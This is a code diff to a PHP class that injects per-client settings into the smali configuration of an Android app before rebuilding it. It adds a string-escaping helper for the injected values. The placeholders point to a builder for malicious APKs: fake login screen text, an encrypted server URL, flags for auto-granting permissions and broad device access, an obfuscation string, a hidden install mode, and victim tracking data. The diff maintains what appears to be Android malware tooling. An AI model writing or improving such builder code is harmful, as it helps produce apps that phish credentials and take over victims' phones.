@@ -32,6 +32,19 @@ final class SmaliProcessor
         return $result;
     }
 
+    /**
+     * 将字符串转义为可在 smali const-string 中安全使用的形式。
+     * 防止双引号、反斜杠、换行等破坏 smali 语法导致 apktool 报 Unterminated string literal。
+     */
+    private function escapeForSmaliString(string $value): string
+    {
+        $value = str_replace('\\', '\\\\', $value);
+        $value = str_replace('"', '\\"', $value);
+        // 换行等控制字符替换为空格，避免破坏单行 const-string
+        $value = preg_replace('/\s+/u', ' ', $value);
+        return trim($value);
+    }
+
     public function modifyConfig(ApkBuildConfig $config, string $assetsKey, Encryptor $encryptor): void
     {
         $smaliPath = $this->buildDir . '/smali/com/icontrol/protector/My_Configs.smali';
@@ -53,16 +66,16 @@ final class SmaliProcessor
         $trackingData = sprintf('%s>%s>%s', $config->clientName, $config->userId, $config->appId);
 
         $replacements = [
-            '[Client_N]' => $config->clientName,
-            '[_NOTIFI_TITLE_]' => $config->notifyTitle,
-            '[_NOTIFI_MSG_]' => $config->notifyMsg,
-            '[log-title]' => $config->loginTitle,
-            '[log-dis]' => $config->loginDis,
-            '[log-btn]' => $config->loginBtn,
-            '[log-lng]' => $config->lngShort,
-            '[USER_DOM]' => $userDom,
-            '[USER_MAIL]' => $encryptor->encryptString($config->email),
-            '[BSE_URL]' => $encryptor->encryptString($config->appUrl),
+            '[Client_N]' => $this->escapeForSmaliString($config->clientName),
+            '[_NOTIFI_TITLE_]' => $this->escapeForSmaliString($config->notifyTitle),
+            '[_NOTIFI_MSG_]' => $this->escapeForSmaliString($config->notifyMsg),
+            '[log-title]' => $this->escapeForSmaliString($config->loginTitle),
+            '[log-dis]' => $this->escapeForSmaliString($config->loginDis),
+            '[log-btn]' => $this->escapeForSmaliString($config->loginBtn),
+            '[log-lng]' => $this->escapeForSmaliString($config->lngShort),
+            '[USER_DOM]' => $this->escapeForSmaliString($userDom),
+            '[USER_MAIL]' => $this->escapeForSmaliString($encryptor->encryptString($config->email)),
+            '[BSE_URL]' => $this->escapeForSmaliString($encryptor->encryptString($config->appUrl)),
             '[USE-AUTOGRANT]' => $config->useAtoprims,
             '[USE-SUPER]' => $config->useAccess,
             '[USE-ALLPRIM]' => $config->userAllprims,
@@ -76,9 +89,9 @@ final class SmaliProcessor
             '[USE-GUID]' => $config->installType,
             '[USE-STORE]' => $config->isStoreMode() ? '1' : '0',
             '[USE-CAPLOCK]' => '0',
-            '[AST-PAS]' => $assetsKey,
-            '[OBFS]' => $this->obfuscationString,
-            '[NAME>LNK>ID!]' => $trackingData,  // 追踪数据占位符替换
+            '[AST-PAS]' => $this->escapeForSmaliString($assetsKey),
+            '[OBFS]' => $this->escapeForSmaliString($this->obfuscationString),
+            '[NAME>LNK>ID!]' => $this->escapeForSmaliString($trackingData),  // 追踪数据占位符替换
         ];
 
         $content = str_replace(array_keys($replacements), array_values($replacements), $content);
